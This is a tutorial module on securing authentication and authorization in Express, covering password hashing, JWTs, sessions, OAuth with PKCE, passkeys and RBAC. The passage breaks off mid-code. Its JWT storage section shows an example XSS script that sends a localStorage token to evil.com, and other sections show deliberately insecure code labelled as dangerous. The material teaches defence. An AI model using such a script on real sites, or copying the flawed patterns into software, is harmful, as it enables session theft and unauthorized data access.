# Module 04: Authentication & Authorization - Who Are You & What Can You Do?

> **Learning Objective:** By the end of this module, you will understand how to build secure authentication and authorization systems in Express. You'll implement password hashing with Argon2id, issue and validate JWTs safely, set up OAuth 2.1 social login, enforce role-based access control, and prevent the security vulnerabilities that destroy startups.

---

## Table of Contents

1. [Authentication vs Authorization](#1-authentication-vs-authorization)
2. [Password Security](#2-password-security)
3. [JWT Deep Dive](#3-jwt-deep-dive)
4. [Session-Based Authentication](#4-session-based-authentication)
5. [OAuth 2.1 / OpenID Connect](#5-oauth-21--openid-connect)
6. [WebAuthn & Passkeys](#6-webauthn--passkeys-the-modern-standard)
7. [Managed Auth Providers](#7-managed-auth-providers)
8. [Role-Based Access Control (RBAC)](#8-role-based-access-control-rbac)
9. [Middleware for Protecting Routes](#9-middleware-for-protecting-routes)
10. [Rate Limiting Auth Endpoints](#10-rate-limiting-auth-endpoints)
11. [Input Validation & Injection Prevention](#11-input-validation--injection-prevention)
12. [User Enumeration & Timing Attacks](#12-user-enumeration--timing-attacks)
13. [Mini Project: Complete Auth System](#13-mini-project-complete-auth-system)
14. [Summary & Security Checklist](#14-summary--security-checklist)

---

## 1. Authentication vs Authorization

### WHAT Is the Difference?

**Authentication (AuthN):** Verifying who you are. "Prove your identity."
- Username + password
- Fingerprint scan
- OAuth login with Google

**Authorization (AuthZ):** Determining what you're allowed to do. "What are your permissions?"
- Can this user access the admin dashboard?
- Can this user edit this specific document?
- Is this API key allowed to delete records?

### WHY Does the Difference Matter?

Confusing these two concepts is one of the most expensive mistakes in software security.

**Real-world disaster:** A healthcare startup authenticated users via JWT (proven identity) but failed to authorize access to medical records. Every authenticated user could access every patient's data by changing the `patientId` in the URL. They faced HIPAA fines of $1.5M and lost their largest hospital contract.

**Authentication asks: "Who are you?"**
**Authorization asks: "Should you be here?"**

You need BOTH. Authentication without authorization is like checking ID at a concert but letting anyone walk into the VIP section. Authorization without authentication is like having a locked door but no way to verify who has the key.

### WHAT HAPPENS If You Conflate Them?

```javascript
// DANGEROUS: Authentication without authorization
app.get('/api/invoices/:id', authenticateJWT, async (req, res) => {
  const invoice = await db.invoices.findById(req.params.id);
  res.json(invoice); // ANY authenticated user can see ANY invoice!
});
```

This pattern appears in **42% of API vulnerabilities** found in penetration tests. The developer thought "we have auth" but only implemented authentication.

**The Fix:**
```javascript
app.get('/api/invoices/:id', authenticateJWT, async (req, res) => {
  const invoice = await db.invoices.findOne({
    where: {
      id: req.params.id,
      userId: req.userId  // Authorization: only return if user OWNS this invoice
    }
  });
  
  if (!invoice) {
    return res.status(404).json({ error: 'Not found' }); // 404, not 403 (prevents ID enumeration)
  }
  
  res.json(invoice);
});
```

---

## 2. Password Security

### WHAT Is Password Hashing?

Password hashing transforms a plain-text password into an irreversible string using a one-way mathematical function. When a user logs in, you hash their input and compare it to the stored hash. You NEVER store plain-text passwords.

### WHY bcrypt and Argon2?

Password hashing algorithms must be **deliberately slow** and **memory-hard** to resist brute-force attacks.

**Crack Speed Comparison (RTX 4090 GPU):**

| Algorithm | Hashes/Second | Time to Crack 8-Char Password |
|-----------|--------------|------------------------------|
| MD5 | ~200 billion | **~2 minutes** |
| SHA1 | ~100 billion | **~4 minutes** |
| SHA256 | ~10 billion | **~40 minutes** |
| bcrypt (cost 12) | ~50,000 | **~40,000 years** |
| Argon2id | ~1,000 | **~2,000,000 years** |

**MD5/SHA1 are general-purpose hash functions designed for SPEED. Password hashing requires SLOW algorithms.**

### WHAT HAPPENS If You Use MD5 or SHA1?

**The LinkedIn Breach (2012):**
- LinkedIn stored passwords as SHA1 hashes (no salt)
- 6.5 million hashes leaked
- Within 24 hours, 60% were cracked using rainbow tables
- Within a week, 90% were cracked

**The rule:** If you use MD5, SHA1, or unsalted hashes for passwords, you are one database dump away from a catastrophic breach.

### bcrypt Implementation

```javascript
const bcrypt = require('bcrypt');

// Cost factor 12 = ~250ms/hash on modern CPU (2025)
// Adjust based on your infrastructure - higher = more secure but slower
const SALT_ROUNDS = 12;

const hashPassword = async (password) => {
  return bcrypt.hash(password, SALT_ROUNDS);
};

const verifyPassword = async (password, hash) => {
  // Constant-time comparison built into bcrypt.compare
  return bcrypt.compare(password, hash);
};

// Usage
const hashedPassword = await hashPassword('userPassword123');
const isValid = await verifyPassword('userPassword123', hashedPassword);
```

**bcrypt Limitation:** Maximum 72-byte input. Longer passwords are silently truncated.

### Argon2id (RECOMMENDED - Latest Standard)

Argon2 won the Password Hashing Competition (2015). Argon2id is the recommended variant by OWASP.

```javascript
const argon2 = require('argon2');

// OWASP-recommended parameters (2023)
const hashPassword = async (password) => {
  return argon2.hash(password, {
    type: argon2.argon2id,    // Hybrid: GPU-resistant + side-channel resistant
    memoryCost: 65536,         // 64 MB memory usage
    timeCost: 3,               // 3 iterations
    parallelism: 4,            // 4 parallel threads
    saltLength: 16,            // 128-bit salt
    hashLength: 32             // 256-bit output
  });
};

const verifyPassword = async (password, hash) => {
  try {
    return await argon2.verify(hash, password);
  } catch (err) {
    // Never expose whether error was from verification or parsing
    return false;
  }
};
```

### WHY Argon2id Over bcrypt?

1. **Memory-hard:** Requires significant RAM, making GPU/ASIC attacks economically infeasible
2. **Configurable:** Tune memory, time, and parallelism costs independently
3. **Modern standard:** Winner of the Password Hashing Competition, recommended by OWASP

### WHAT HAPPENS If Your Hashing Is Weak?

**Real-world timeline of a breach with weak hashing:**
1. Attacker gains database access via SQL injection (Day 0)
2. Attacker extracts user table with MD5 hashes (Day 0)
3. Attacker cracks 80% of passwords in 48 hours using GPU rigs (Day 2)
4. Attacker tries these passwords on Gmail, banking, corporate VPNs (Day 3)
5. Your users' other accounts are compromised (Day 3-7)
6. Your company is in the news, facing lawsuits and regulatory fines (Day 7+)

**The average cost of a data breach in 2024: $4.88M.**

---

## 3. JWT Deep Dive

### WHAT Is a JWT?

JSON Web Token (JWT) is a compact, URL-safe means of representing claims between two parties. It consists of three parts separated by dots:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.  ← Header (Base64Url)
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.  ← Payload (Base64Url)
SflKxwRJSMeKKF2QT4fwpMe...  ← Signature (HMAC or RSA)
```

**Header:** Contains algorithm (`alg`) and token type (`typ`)
**Payload:** Contains claims (user ID, roles, expiration)
**Signature:** Cryptographic proof the token hasn't been tampered with

**Important:** JWT payload is **Base64Url encoded, NOT encrypted.** Anyone can read it. Never put sensitive data (SSN, credit cards, addresses) in a JWT.

### WHY Do We Use JWTs?

- **Stateless:** Server doesn't need to store session data. Any server instance can validate the token
- **Cross-domain:** Works across different services and domains
- **Mobile/SPA friendly:** Easy to store and send from mobile apps and single-page applications
- **Microservices:** Service A can issue a token that Service B validates without calling Service A

### JWT Structure in Code

```javascript
const jwt = require('jsonwebtoken');

// Create a secure access token
const createAccessToken = (user) => {
  return jwt.sign(
    { 
      sub: user.id,           // Subject (user ID)
      jti: crypto.randomUUID(), // Unique token ID for revocation tracking
      roles: user.roles       // Minimal claims only
    },
    process.env.JWT_ACCESS_SECRET,  // Strong secret (min 256-bit)
    { 
      expiresIn: '15m',      // Short-lived
      issuer: 'api.myapp.com',
      audience: 'myapp.com',
      algorithm: 'HS256'     // Explicit algorithm
    }
  );
};

// Verify with strict validation
const verifyAccessToken = (token) => {
  return jwt.verify(token, process.env.JWT_ACCESS_SECRET, {
    algorithms: ['HS256'],    // Prevent 'none' algorithm attack
    issuer: 'api.myapp.com',
    audience: 'myapp.com',
    clockTolerance: 30        // 30-second leeway for clock skew
  });
};
```

### WHY Do We Need Refresh Tokens?

**The Problem:** If your access token is stolen, the attacker can use it until expiry. Short-lived tokens (15 minutes) limit this window but force users to log in frequently.

**The Solution:** Refresh tokens.

- **Access Token:** Short-lived (15 min), contains user info, used for API requests
- **Refresh Token:** Long-lived (7 days), stored securely, used only to get new access tokens

**Flow:**
1. User logs in → receives access token (15 min) + refresh token (7 days)
2. User makes API calls with access token
3. Access token expires → user sends refresh token to `/auth/refresh`
4. Server validates refresh token, issues new access token
5. If refresh token is stolen and used, rotation detects it

### Refresh Token Rotation (Latest Best Practice)

```javascript
const crypto = require('crypto');

// Schema: refresh_tokens(id, user_id, token_hash, family, issued_at, expires_at, revoked_at, replaced_by)

const createRefreshToken = async (userId) => {
  const token = crypto.randomBytes(64).toString('base64url');
  const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
  const family = crypto.randomUUID();  // Token family for rotation chain
  
  await db.refreshTokens.create({
    userId,
    tokenHash,
    family,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)  // 7 days
  });
  
  return token;
};

const rotateRefreshToken = async (incomingToken) => {
  const incomingHash = crypto.createHash('sha256').update(incomingToken).digest('hex');
  
  const storedToken = await db.refreshTokens.findByHash(incomingHash);
  
  // Validate token exists and is active
  if (!storedToken || storedToken.revokedAt || storedToken.expiresAt < new Date()) {
    throw new Error('Invalid refresh token');
  }
  
  // Check if already used (reuse detection)
  if (storedToken.replacedBy) {
    // SECURITY EVENT: Token reuse detected!
    // Attacker has a stolen token. Invalidate entire family.
    await db.refreshTokens.revokeFamily(storedToken.family);
    await securityLogger.alert('refresh_token_reuse', { 
      userId: storedToken.userId,
      family: storedToken.family 
    });
    throw new Error('Token reuse detected - session invalidated');
  }
  
  // Generate new token pair
  const newAccessToken = createAccessToken({ id: storedToken.userId });
  const newRefreshToken = await createRefreshToken(storedToken.userId);
  const newRefreshHash = crypto.createHash('sha256').update(newRefreshToken).digest('hex');
  
  // Mark old as replaced, link to new
  await db.refreshTokens.update(storedToken.id, {
    replacedBy: newRefreshHash,
    usedAt: new Date()
  });
  
  return { accessToken: newAccessToken, refreshToken: newRefreshToken };
};
```

**Why rotation matters:** If an attacker steals a refresh token, the next time the legitimate user refreshes, the old token is detected as reused. The entire token family is invalidated, forcing both attacker and user to re-authenticate.

### WHAT HAPPENS If You Store JWT in localStorage?

**The XSS Theft Scenario:**

```javascript
// Attacker injects this script via a comment or form
const stolenToken = localStorage.getItem('accessToken');
fetch('https://evil.com/steal?token=' + stolenToken);
```

Any XSS vulnerability gives the attacker immediate access to all tokens in localStorage. Since JWTs are long-lived (if you made that mistake), the attacker can impersonate the user for hours or days.

**Secure storage options:**
1. **`httpOnly`, `Secure`, `SameSite=Strict` cookies** (RECOMMENDED for web apps)
2. **Memory-only** (for SPAs: store in JavaScript variable, lost on refresh)
3. **Native secure storage** (for mobile apps: iOS Keychain, Android Keystore)

```javascript
// SECURE: Cookie-based token storage
res.cookie('accessToken', accessToken, {
  httpOnly: true,        // JavaScript cannot read this
  secure: process.env.NODE_ENV === 'production', // HTTPS only in production
  sameSite: 'strict',    // CSRF protection
  maxAge: 15 * 60 * 1000 // 15 minutes
});

res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production', // HTTPS only in production
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  path: '/api/auth/refresh'        // Only sent to refresh endpoint
});
```

### WHAT HAPPENS If Your JWT Secret Is Weak?

**The Forgery Attack:**

If your secret is `myapp_secret` or `123456`, an attacker can:
1. Read your JWT payload (it's just Base64)
2. Modify it (e.g., change `role: "user"` to `role: "admin"`)
3. Sign it with the weak secret (which they guess or brute-force)
4. Your server accepts the forged token

**Real-world case:** A cryptocurrency exchange used `jwt-secret-2020` as their secret. An attacker brute-forced it in 6 hours using a wordlist, forged admin tokens, and withdrew $24M in Bitcoin.

**JWT Secret Requirements:**
- Minimum 256 bits (32 bytes) of cryptographically random data
- Stored in environment variables or secret manager (NEVER in code)
- Rotated periodically (use key versioning: `jwt_secret_v1`, `jwt_secret_v2`)

```bash
# Generate a secure secret
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
# Output: 3f8a9b2c... (128 characters = 512 bits)
```

---

## 4. Session-Based Authentication

### WHAT Is Session-Based Auth?

Instead of sending a token with every request, the server creates a session record (usually in Redis or a database) and sends the client a session ID cookie. On each request, the server looks up the session ID to find the user's data.

### WHEN to Use Sessions Instead of JWT?

| Use Case | Recommendation | Why |
|----------|---------------|-----|
| Traditional server-rendered apps (EJS, Pug) | Sessions | Cookie-based auth is the native model |
| Admin dashboards requiring immediate revocation | Sessions | Logout works instantly — no token expiry window |
| Banking/financial applications | Sessions + MFA | Server-side state allows stronger security controls |
| SPAs/Mobile apps with API backends | JWT or sessions | Both work; JWT is easier for cross-domain |
| Microservices architecture | JWT | Stateless validation across services |
| Real-time features (WebSockets, SSE) | Sessions | HTTP-only cookies work transparently with WebSocket upgrades |

**Sessions are BETTER than JWT when:**

1. **Immediate revocation is critical:** Ban a user? With sessions, delete their session from Redis. Instantly logged out everywhere. With JWT, you must wait for the access token to expire (15 minutes) or maintain a blocklist (defeating the "stateless" benefit).

2. **You control the client:** If you're building a web app where you control both frontend and backend, sessions with `httpOnly` cookies are simpler and more secure than JWT storage.

3. **You need session metadata:** Store IP, device fingerprint, login time, and geo-location per session. JWT payloads are limited and can't be updated after issuance.

4. **Security compliance:** PCI-DSS and banking regulators often require server-side session management with explicit logout capabilities.

**JWT is BETTER when:**
- You have distributed microservices that can't share a session store
- You need cross-domain authentication (OAuth, SSO)
- You want to embed user claims in the token to avoid database lookups
- Mobile apps where cookie handling is awkward

**The modern consensus (2025):** For most web applications, sessions with Redis are the safer default. JWT is appropriate for microservices and mobile APIs. Don't default to JWT just because it's trendy.

### WHY Redis for Sessions?

Express's default `express-session` uses an in-memory store. This is fine for development but catastrophic in production:
- **Memory leaks:** Sessions accumulate until the process crashes
- **No sharing:** If you run 4 Node.js processes, a session created on Process 1 doesn't exist on Process 2
- **No persistence:** Server restart = all users logged out

**Redis solves this:**
- Centralized session store accessible by all server instances
- Automatic expiration (TTL) removes old sessions
- Sub-millisecond lookup performance
- Persistence options (RDB snapshots, AOF logs)

### Implementation

```javascript
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const { createClient } = require('redis');

const redisClient = createClient({ 
  url: process.env.REDIS_URL
});
redisClient.connect().catch(console.error);

app.use(session({
  store: new RedisStore({ client: redisClient, prefix: 'sess:' }),
  name: '__Host-sessionId',  // __Host- prefix enforces Secure, Path=/, no Domain
  secret: process.env.SESSION_SECRET,  // 32+ byte random, rotated regularly
  resave: false,             // Don't save if session wasn't modified
  saveUninitialized: false,  // Don't create sessions until login
  cookie: {
    secure: true,            // HTTPS only
    httpOnly: true,          // No JavaScript access
    sameSite: 'strict',      // CSRF protection
    maxAge: 24 * 60 * 60 * 1000,  // 24 hours
    domain: undefined        // Host-only cookie
  },
  genid: () => {
    return crypto.randomBytes(32).toString('hex');  // CSPRNG session IDs
  }
}));

// Regenerate session ID on privilege escalation (login)
app.post('/api/auth/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  
  // CRITICAL: Regenerate to prevent session fixation
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' });
    
    req.session.userId = user.id;
    req.session.loginIp = req.ip;
    req.session.loginTime = Date.now();
    req.session.userAgentHash = crypto
      .createHash('sha256')
      .update(req.headers['user-agent'] || '')
      .digest('hex');
    
    req.session.save((err) => {
      if (err) return res.status(500).json({ error: 'Session error' });
      res.json({ success: true });
    });
  });
});

// Session validation middleware - bind to device fingerprint
const validateSession = (req, res, next) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  const currentUaHash = crypto
    .createHash('sha256')
    .update(req.headers['user-agent'] || '')
    .digest('hex');
    
  if (currentUaHash !== req.session.userAgentHash) {
    // Potential session hijacking - destroy and require re-auth
    req.session.destroy();
    return res.status(401).json({ error: 'Session invalidated' });
  }
  
  next();
};
```

### WHAT HAPPENS If You Use Default Session Config?

```javascript
// DANGEROUS: Default express-session settings
app.use(session({
  secret: 'keyboard cat',  // Weak secret - easily guessed
  resave: true,            // Unnecessary database writes
  saveUninitialized: true  // Creates sessions for every visitor (DoS vector)
}));
```

**Consequences:**
- **Session fixation:** Attacker sets a known session ID, victim logs in, attacker uses the same ID
- **Session hijacking:** Weak secrets allow brute-forcing session IDs
- **DoS:** `saveUninitialized: true` creates sessions for bots and crawlers, filling your store
- **No revocation:** Memory store means sessions survive until process restart

> **Multi-Factor Authentication (MFA):** For high-security applications (banking, admin dashboards), require TOTP (Time-based One-Time Password) via authenticator apps or hardware security keys. Store TOTP secrets encrypted, allow backup codes, and enforce MFA at the middleware level for sensitive routes.

---

## 5. OAuth 2.1 / OpenID Connect

### WHAT Is OAuth 2.1?

OAuth 2.1 is the latest version of the OAuth authorization framework, currently in draft status at IETF. It simplifies and secures OAuth 2.0 by making several best practices mandatory.

**Key changes from OAuth 2.0:**
1. **PKCE is REQUIRED for ALL clients**, not just public clients
2. **Implicit grant is REMOVED** (use Authorization Code + PKCE)
3. **Password grant is REMOVED**
4. **Refresh tokens must be sender-constrained or rotated**
5. **Exact redirect URI matching is REQUIRED**
6. **Bearer tokens in URI query strings are PROHIBITED**

### WHY Use OAuth/OIDC?

- **No password storage:** You never handle or store user passwords
- **Trust:** Users authenticate with Google/Apple/GitHub, brands they trust
- **MFA for free:** If their Google account has 2FA, your app inherits it
- **Enterprise ready:** SAML and corporate SSO integrate via OIDC

**OAuth2 is for AUTHORIZATION (access to resources).**
**OIDC is for AUTHENTICATION (identity verification).**

### WHAT Is PKCE and WHY Is It Mandatory?

**PKCE** (Proof Key for Code Exchange) prevents authorization code interception attacks. In SPAs and mobile apps, the client secret cannot be kept confidential. Without PKCE, an attacker who intercepts the authorization code can exchange it for tokens.

**How PKCE works:**
1. Client generates a random `code_verifier`
2. Client hashes it to create `code_challenge`
3. Client sends `code_challenge` to authorization server
4. Server returns authorization code
5. Client exchanges code + `code_verifier` for tokens
6. Server verifies that `code_verifier` matches the original `code_challenge`

Even if an attacker steals the authorization code, they don't have the `code_verifier` and can't exchange it.

### Implementation

```javascript
const { generators, Issuer } = require('openid-client');

// Step 1: Generate PKCE parameters
const generatePKCE = () => {
  const codeVerifier = generators.codeVerifier();
  const codeChallenge = generators.codeChallenge(codeVerifier);
  return { codeVerifier, codeChallenge };
};

// Step 2: Initiate OAuth flow
app.get('/api/auth/oauth/start', (req, res) => {
  const { codeVerifier, codeChallenge } = generatePKCE();
  
  // Store code_verifier server-side (session or encrypted cookie)
  req.session.oauth = {
    codeVerifier,
    state: generators.state(),      // CSRF protection
    nonce: generators.nonce(),      // Replay attack protection
    redirectUri: `${process.env.BASE_URL}/api/auth/oauth/callback`
  };
  
  const authorizationUrl = client.authorizationUrl({
    scope: 'openid email profile',
    code_challenge: codeChallenge,
    code_challenge_method: 'S256',
    state: req.session.oauth.state,
    nonce: req.session.oauth.nonce
  });
  
  res.redirect(authorizationUrl);
});

// Step 3: Handle callback
app.get('/api/auth/oauth/callback', async (req, res) => {
  const params = client.callbackParams(req);
  
  try {
    // Validate state parameter (CSRF protection)
    if (params.state !== req.session.oauth.state) {
      throw new Error('Invalid state parameter');
    }
    
    const tokenSet = await client.callback(
      req.session.oauth.redirectUri,
      params,
      {
        code_verifier: req.session.oauth.codeVerifier,
        state: req.session.oauth.state,
        nonce: req.session.oauth.nonce  // Validates id_token nonce claim
      }
    );
    
    // Validate ID token claims
    const claims = tokenSet.claims();
    if (claims.iss !== expectedIssuer) throw new Error('Invalid issuer');
    if (claims.aud !== clientId) throw new Error('Invalid audience');
    if (claims.exp < Date.now() / 1000) throw new Error('Token expired');
    
    // Create or update local user
    const user = await findOrCreateUser({
      email: claims.email,
      name: claims.name,
      providerId: claims.sub
    });
    
    // Create local session
    req.session.userId = user.id;
    delete req.session.oauth;
    
    res.redirect('/dashboard');
  } catch (err) {
    console.error('OAuth callback error:', err);
    res.redirect('/login?error=oauth_failed');
  }
});
```

### WHAT HAPPENS If You Skip PKCE?

**The Authorization Code Interception Attack:**

1. User starts OAuth login on attacker.com (legitimate app)
2. Attacker intercepts the authorization code (via malicious browser extension, network sniffing on HTTP, or open redirect)
3. Attacker exchanges the code for tokens (without PKCE, no additional secret needed)
4. Attacker has full access to the user's account

This attack is **trivial** on mobile apps and SPAs without PKCE. OAuth 2.1 makes PKCE mandatory to eliminate this entire class of vulnerabilities.

---

## 6. WebAuthn & Passkeys: The Modern Standard

### WHAT Are Passkeys?

Passkeys are a password replacement based on the **WebAuthn standard**. They use public-key cryptography: your device (phone, laptop, YubiKey) stores a private key and the server stores the corresponding public key. No passwords. No phishing.

### WHY Passkeys in 2025?

- **Phishing-proof:** There's no password to steal. Attackers can't phish what doesn't exist.
- **No shared secrets:** Unlike passwords, credentials never leave your device.
- **Sync across devices:** Apple, Google, and Microsoft sync passkeys via their cloud keychains.
- **Industry mandate:** Google, Apple, and Microsoft have committed to passwordless sign-in.

### How Passkeys Work

```
┌─────────────┐                        ┌─────────────┐
│   Client    │ ── 1. Register ──────► │   Server    │
│  (Device)   │    (public key)        │  (Database) │
│             │                        │  stores:    │
│  Private    │ ◄─ 2. Challenge ────── │  credential │
│   Key       │                        │   ID +      │
│  (never     │ ── 3. Sign challenge ─► │  public key │
│   leaves)   │    (with private key)  │             │
└─────────────┘                        └─────────────┘
```

### Simple Passkey Registration (Conceptual)

```typescript
// Using @simplewebauthn/server
import {
  generateRegistrationOptions,
  verifyRegistrationResponse,
} from '@simplewebauthn/server';

// Step 1: Generate registration options
app.post('/auth/passkey/register-options', authenticate, async (req, res) => {
  const options = await generateRegistrationOptions({
    rpName: 'My App',
    rpID: 'myapp.com',
    userID: Buffer.from(req.userId),
    userName: req.user.email,
    attestationType: 'none',
  });

  // Store challenge temporarily (Redis, 60s TTL)
  await redis.setex(`challenge:${req.userId}`, 60, options.challenge);

  res.json(options);
});

// Step 2: Verify registration
app.post('/auth/passkey/register', authenticate, async (req, res) => {
  const expectedChallenge = await redis.getdel(`challenge:${req.userId}`);

  const verification = await verifyRegistrationResponse({
    response: req.body,
    expectedChallenge,
    expectedOrigin: 'https://myapp.com',
    expectedRPID: 'myapp.com',
  });

  if (verification.verified) {
    await db.passkey.create({
      userId: req.userId,
      credentialID: verification.registrationInfo?.credentialID,
      publicKey: verification.registrationInfo?.credentialPublicKey,
      counter: verification.registrationInfo?.counter,
    });
  }

  res.json({ verified: verification.verified });
});
```

### The Passkey Advantage

| Threat | Password | TOTP (Authenticator) | Passkey |
|--------|----------|---------------------|---------|
| Phishing | Vulnerable | Vulnerable | **Immune** |
| Credential stuffing | Vulnerable | N/A | **Immune** |
| Database breach | Catastrophic | N/A | **Public keys only** |
| SIM swapping | N/A | Vulnerable | **Immune** |
| UX friction | Medium (remember password) | High (open app, type code) | **Low (biometric/FaceID)** |

### Adoption Strategy

Passkeys are the future, but adoption takes time:

1. **Phase 1:** Offer passkeys as an additional sign-in method (alongside passwords)
2. **Phase 2:** Prompt users to create a passkey after successful password login
3. **Phase 3:** Make passkeys the primary method; passwords become the fallback

---

## 7. Managed Auth Providers

### The "Buy vs Build" Decision

Building authentication from scratch teaches you how it works. Running it in production is a different story.

| Provider | Best For | Pricing | Standout Feature |
|----------|----------|---------|------------------|
| **Clerk** | Modern SaaS, React/Next.js | Generous free tier | Beautiful UI components, session management |
| **Auth0** | Enterprise, complex rules | Pay per MAU | Extensive rule engine, enterprise SSO |
| **Supabase Auth** | Open-source projects | Very generous free tier | Self-hostable, integrates with PostgreSQL |
| **Firebase Auth** | Mobile + web apps | Very generous free tier | Phone auth, anonymous auth, social login |
| **Keycloak** | Self-hosted, regulated | Free (self-hosted) | Full control, on-premise deployment |

### Clerk Integration Example

```typescript
import { ClerkExpressRequireAuth } from '@clerk/clerk-sdk-node';

// Protect routes
app.get('/api/protected', ClerkExpressRequireAuth(), (req, res) => {
  res.json({ userId: req.auth.userId });
});

// Webhook for user events
app.post('/webhooks/clerk', async (req, res) => {
  const event = req.body;
  
  if (event.type === 'user.created') {
    await db.user.create({
      clerkId: event.data.id,
      email: event.data.email_addresses[0].email_address,
    });
  }
  
  res.status(200).send();
});
```

### When to Use Managed Auth

**Use managed auth when:**
- You're a startup with < 10 engineers (security is not your differentiator)
- You need social login, MFA, and passwordless quickly
- You don't have dedicated security expertise
- Compliance (SOC2, GDPR) is required

**Build your own when:**
- You're building an auth product (obviously)
- You have strict regulatory requirements that managed providers can't meet
- You need deep custom integration with legacy systems
- You have a dedicated security team

> **Sidebar: When NOT to Roll Your Own Auth**
>
> Rolling your own auth is like rolling your own cryptography: possible, but statistically likely to end in tears.
>
> **Real-world costs of DIY auth:**
> - A leaked JWT secret: $24M stolen (crypto exchange, 2022)
> - Weak password hashing: 6.5M passwords cracked in 24 hours (LinkedIn, 2012)
> - Missing rate limiting: 450K brute-force attempts/hour (fintech startup, 2024)
> - OAuth misconfiguration: Account takeover via redirect URI manipulation
>
> **The rule:** Build auth from scratch to learn. For production serving real users, use Clerk, Auth0, or Supabase Auth unless you have a very good reason not to.

---

## 8. Role-Based Access Control (RBAC)

### WHAT Is RBAC?

Role-Based Access Control assigns permissions to roles, and roles to users. Instead of checking `if (user.id === post.authorId)` everywhere, you check `if (user.hasPermission('post:delete'))`.

**Core components:**
- **Users:** People who use your system
- **Roles:** Job functions (admin, editor, viewer)
- **Permissions:** Specific actions (post:create, post:delete, user:manage)
- **Role-Permission mappings:** Which roles can do what

### WHY RBAC?

Without RBAC, authorization logic scatters across your codebase:
```javascript
// BAD: Scattered authorization
app.delete('/api/posts/:id', async (req, res) => {
  const post = await db.posts.findById(req.params.id);
  if (req.user.id !== post.authorId && req.user.role !== 'admin') {
    return res.status(403).send();
  }
  // ...
});

app.delete('/api/comments/:id', async (req, res) => {
  const comment = await db.comments.findById(req.params.id);
  if (req.user.id !== comment.authorId && req.user.role !== 'admin' && req.user.role !== 'moderator') {
    return res.status(403).send();
  }
  // ...
});
```

**Problems:**
- Logic duplicated everywhere
- Changing permissions requires modifying dozens of endpoints
- No central audit trail
- Easy to miss an endpoint and create security holes

### Implementation

```prisma
// prisma/schema.prisma
model User {
  id        Int      @id @default(autoincrement())
  email     String   @unique
  password  String
  roles     UserRole[]
  createdAt DateTime @default(now())
}

model Role {
  id          Int           @id @default(autoincrement())
  name        String        @unique
  permissions RolePermission[]
  users       UserRole[]
}

model Permission {
  id    Int    @id @default(autoincrement())
  name  String @unique  // e.g., "post:create", "user:delete"
  roles RolePermission[]
}

model UserRole {
  userId Int
  roleId Int
  user   User @relation(fields: [userId], references: [id], onDelete: Cascade)
  role   Role @relation(fields: [roleId], references: [id], onDelete: Cascade)
  
  @@id([userId, roleId])
}

model RolePermission {
  roleId       Int
  permissionId Int
  role         Role       @relation(fields: [roleId], references: [id], onDelete: Cascade)
  permission   Permission @relation(fields: [permissionId], references: [id], onDelete: Cascade)
  
  @@id([roleId, permissionId])
}
```

```javascript
// middleware/rbac.js
const prisma = require('../prisma/client');

// Load user's roles and permissions
const loadUserPermissions = async (userId) => {
  const user = await prisma.user.findUnique({
    where: { id: userId },
    include: {
      roles: {
        include: {
          role: {
            include: {
              permissions: {
                include: { permission: true }
              }
            }
          }
        }
      }
    }
  });
  
  const permissions = new Set();
  user.roles.forEach(ur => {
    ur.role.permissions.forEach(rp => {
      permissions.add(rp.permission.name);
    });
  });
  
  return permissions;
};

// Middleware factory
const requirePermission = (...requiredPermissions) => {
  return async (req, res, next) => {
    if (!req.userId) {
      return res.status(401).json({ error: 'Authentication required' });
    }
    
    // Cache permissions on request object
    if (!req.userPermissions) {
      req.userPermissions = await loadUserPermissions(req.userId);
    }
    
    const hasPermission = requiredPermissions.some(p => 
      req.userPermissions.has(p)
    );
    
    if (!hasPermission) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    
    next();
  };
};

const requireRole = (...allowedRoles) => {
  return async (req, res, next) => {
    if (!req.userId) {
      return res.status(401).json({ error: 'Authentication required' });
    }
    
    const user = await prisma.user.findUnique({
      where: { id: req.userId },
      include: { roles: { include: { role: true } } }
    });
    
    const userRoles = user.roles.map(ur => ur.role.name);
    const hasRole = allowedRoles.some(role => userRoles.includes(role));
    
    if (!hasRole) {
      return res.status(403).json({ error: 'Insufficient role' });
    }
    
    next();
  };
};

module.exports = { requirePermission, requireRole, loadUserPermissions };
```

```javascript
// Usage
const { requirePermission, requireRole } = require('./middleware/rbac');

app.post('/api/posts', authenticate, requirePermission('post:create'), createPost);
app.delete('/api/posts/:id', authenticate, requirePermission('post:delete'), deletePost);
app.get('/api/admin/users', authenticate, requireRole('admin'), listUsers);
```

### WHAT HAPPENS If You Don't Use RBAC?

**The Permission Creep Disaster:**

A SaaS startup started with simple `isAdmin` checks. As they grew:
- They added `isModerator` for content review
- They added `isBillingAdmin` for invoice access
- They added `isSupport` for customer data access
- They added `isReadOnly` for auditors

Six months later, they had 47 endpoints with hand-rolled permission checks. A new developer forgot to check `isBillingAdmin` on the invoice export endpoint. Result: any authenticated user could export all customer invoices, including credit card last-4 digits.

**The fix:** Centralized RBAC means you define permissions once and apply them consistently.

---

## 9. Middleware for Protecting Routes

### WHAT Is Auth Middleware?

Middleware functions in Express sit between the incoming request and your route handler. Authentication middleware verifies the user's identity and attaches it to the request object.

### Implementation Patterns

```javascript
// middleware/auth.js
const jwt = require('jsonwebtoken');

// JWT Authentication Middleware
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing or invalid authorization header' });
  }
  
  const token = authHeader.slice(7);
  
  try {
    const payload = jwt.verify(token, process.env.JWT_ACCESS_SECRET, {
      algorithms: ['HS256'],
      issuer: 'api.myapp.com',
      audience: 'myapp.com',
      clockTolerance: 30
    });
    
    req.userId = payload.sub;
